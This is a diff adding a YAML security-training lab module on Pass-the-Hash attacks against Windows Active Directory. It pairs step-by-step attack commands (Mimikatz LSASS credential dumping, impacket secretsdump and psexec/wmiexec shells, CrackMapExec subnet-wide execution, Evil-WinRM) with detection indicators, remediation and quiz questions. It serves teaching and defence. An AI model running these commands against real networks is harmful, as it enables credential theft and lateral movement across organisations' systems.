@@ -1,0 +1,194 @@
+name: "Pass-the-Hash (PtH) Attack"
+id: "ad-pth-001"
+category: "Active Directory Security"
+subcategory: "Credential Attacks"
+difficulty: "intermediate"
+estimated_time: "45"
+
+tags:
+  - active-directory
+  - credential-access
+  - pass-the-hash
+  - ntlm
+  - mimikatz
+  - impacket
+  - crackmapexec
+  - evil-winrm
+  - lateral-movement
+  - mitre-t1550.002
+
+description: |
+  Authenticate to network services using captured NTLM password hashes without
+  knowing the plaintext password. Exploit Windows NTLM authentication to move
+  laterally across the domain without cracking credentials.
+
+learning_objectives:
+  - Extract NTLM hashes from memory using Mimikatz and impacket
+  - Use PtH to authenticate against SMB, WMI, WinRM, and RDP
+  - Perform lateral movement across domain systems with a single hash
+  - Map to MITRE ATT&CK T1550.002 and understand NTLM relay extension
+
+tools:
+  - "Mimikatz"
+  - "Impacket"
+  - "CrackMapExec"
+  - "Evil-WinRM"
+  - "Metasploit"
+
+prerequisites:
+  - "Local Administrator or SYSTEM access on at least one domain-joined machine"
+  - "Network access to target systems (TCP 445, TCP 5985, TCP 3389)"
+  - "Valid NTLM hash for a user with access to target"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Extract NTLM hashes from LSASS memory using Mimikatz"
+    commands:
+      - "# Run Mimikatz with admin rights"
+      - "mimikatz.exe"
+      - "privilege::debug"
+      - "sekurlsa::logonpasswords"
+      - "# Dump only hashes (quieter)"
+      - "sekurlsa::msv"
+      - "# Dump hashes to file"
+      - "sekurlsa::logonpasswords > C:\\temp\\lsass_dump.txt"
+    expected_output: "NTLM hashes for all currently logged-on users including domain accounts"
+    detection: "LSASS access event (Sysmon Event ID 10); Event ID 4688 for mimikatz process"
+
+  - id: "step2"
+    phase: "reconnaissance"
+    action: "Extract hashes from LSASS dump remotely using impacket"
+    commands:
+      - "# Remote LSASS dump via CrackMapExec"
+      - "crackmapexec smb [target_ip] -u [local_admin] -p [password] --lsa"
+      - "crackmapexec smb [target_ip] -u [local_admin] -p [password] -M lsassy"
+      - "crackmapexec smb [target_ip] -u [local_admin] -p [password] --sam"
+      - "# Using impacket secretsdump"
+      - "impacket-secretsdump '[domain]/[username]:[password]@[target_ip]'"
+      - "impacket-secretsdump '[domain]/[username]' -hashes ':[ntlm_hash]' @[target_ip]"
+    expected_output: "NTLM hashes for local and domain accounts cached on target"
+    detection: "Remote SAM/LSA access; DRSUAPI calls; Event ID 4624 Type 3 logon from attacker"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Pass-the-Hash to SMB using impacket"
+    commands:
+      - "# SMB client PtH"
+      - "impacket-smbclient '[domain]/[target_user]' -hashes ':[ntlm_hash]' @[target_ip]"
+      - "# List shares"
+      - "impacket-smbclient '[domain]/[target_user]' -hashes ':[ntlm_hash]' @[target_ip] -c 'ls'"
+      - "# PSExec via PtH (spawns SYSTEM shell)"
+      - "impacket-psexec '[domain]/[target_user]' -hashes ':[ntlm_hash]' @[target_ip]"
+      - "# WMIExec via PtH (semi-interactive)"
+      - "impacket-wmiexec '[domain]/[target_user]' -hashes ':[ntlm_hash]' @[target_ip]"
+      - "# SMBExec via PtH (service-based)"
+      - "impacket-smbexec '[domain]/[target_user]' -hashes ':[ntlm_hash]' @[target_ip]"
+    expected_output: "Interactive shell or command execution on target system"
+    detection: "Event ID 4624 Type 3 logon (Network) with NTLMv2 from unexpected source"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Pass-the-Hash via CrackMapExec for network-wide lateral movement"
+    commands:
+      - "# Test PtH across entire subnet"
+      - "crackmapexec smb [target_range] -u [target_user] -H [ntlm_hash] -d [domain]"
+      - "# Mark systems where user is local admin"
+      - "crackmapexec smb [target_range] -u [target_user] -H [ntlm_hash] -d [domain] --continue-on-success"
+      - "# Execute command on all accessible systems"
+      - "crackmapexec smb [target_range] -u [target_user] -H [ntlm_hash] -d [domain] -x 'whoami /all'"
+      - "# Dump SAM on accessible systems"
+      - "crackmapexec smb [target_range] -u [target_user] -H [ntlm_hash] -d [domain] --sam"
+    expected_output: "Pwn3d! on systems where target user has administrative access"
+    detection: "Multiple simultaneous Event ID 4624 Type 3 logons across domain from single source IP"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Pass-the-Hash to WinRM using Evil-WinRM"
+    commands:
+      - "evil-winrm -i [target_ip] -u [target_user] -H [ntlm_hash]"
+      - "# With domain"
+      - "evil-winrm -i [target_ip] -u [target_user]@[domain] -H [ntlm_hash]"
+    expected_output: "PowerShell remoting session as target user"
+    detection: "Event ID 4624 Type 3 logon via WinRM (port 5985); Event ID 4648"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Pass-the-Hash using Mimikatz sekurlsa (Windows)"
+    commands:
+      - "# PtH in Mimikatz — spawns new process with injected credentials"
+      - "sekurlsa::pth /user:[target_user] /domain:[domain] /ntlm:[ntlm_hash] /run:cmd.exe"
+      - "# Then from the new cmd window"
+      - "net use \\\\[target_ip]\\C$"
+      - "dir \\\\[target_ip]\\C$"
+      - "psexec \\\\[target_ip] cmd.exe"
+    expected_output: "New process spawned with target user's NTLM credentials; access to remote shares"
+    detection: "Process creation with injected credentials; unusual parent-child process relationship"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1550.002"
+    description: "Use Alternate Authentication Material: Pass the Hash"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-3"
+    description: "Device identification and authentication"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges"
+  - standard: "PCI DSS v4.0"
+    control: "8.2.1"
+    description: "Accounts used by systems/applications do not allow interactive login"
+
+detection:
+  network_indicators:
+    - "NTLMv1/v2 authentication to multiple hosts from single source in short window"
+    - "SMB authentication from workstation to workstation (lateral movement pattern)"
+    - "Type 3 Network logons for accounts that normally only use interactive logons"
+  log_indicators:
+    - "Event ID 4624 Logon Type 3 with NTLM authentication from unexpected source"
+    - "Event ID 4648: Logon using explicit credentials (over-pass-the-hash)"
+    - "Event ID 4625 followed by 4624 from same source (spraying pattern)"
+  endpoint_indicators:
+    - "Mimikatz execution (process name, file hash)"
+    - "LSASS memory read access from non-system processes (Sysmon Event ID 10)"
+    - "sekurlsa:: commands in PowerShell/command history"
+
+remediation:
+  immediate:
+    - "Enable Local Administrator Password Solution (LAPS) for unique local admin passwords"
+    - "Disable NTLM authentication where possible, enforce Kerberos"
+    - "Identify and contain affected systems, reset compromised account passwords"
+  long_term:
+    - "Implement Credential Guard (VBS-based LSASS protection)"
+    - "Deploy tiered administration model — no Domain Admins logging into workstations"
+    - "Enable Protected Users security group for privileged accounts"
+    - "Block lateral movement with firewall rules (no workstation-to-workstation SMB)"
+    - "Deploy Privileged Access Workstations (PAW)"
+    - "Enforce network logon restrictions via GPO (deny network logon for local accounts)"
+
+variables:
+  domain: "corp.example.com"
+  username: "jsmith"
+  password: "Password123"
+  target_user: "administrator"
+  ntlm_hash: "aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+  target_ip: "192.168.1.50"
+  target_range: "192.168.1.0/24"
+  local_admin: "localadmin"
+
+assessment_questions:
+  - "Why does Pass-the-Hash work — what NTLM authentication weakness does it exploit?"
+  - "What is the difference between Pass-the-Hash and Overpass-the-Hash?"
+  - "How does LAPS mitigate lateral movement via Pass-the-Hash?"
+  - "What Windows feature prevents NTLM hash extraction from LSASS memory?"
+  - "Which Event IDs should be monitored to detect Pass-the-Hash activity?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1550/002/"
+    title: "MITRE ATT&CK - Pass the Hash"
+  - url: "https://github.com/gentilkiwi/mimikatz"
+    title: "Mimikatz"
+  - url: "https://github.com/byt3bl33d3r/CrackMapExec"
+    title: "CrackMapExec"
+  - url: "https://www.microsoft.com/en-us/download/details.aspx?id=36036"
+    title: "Microsoft - Mitigating Pass-the-Hash"
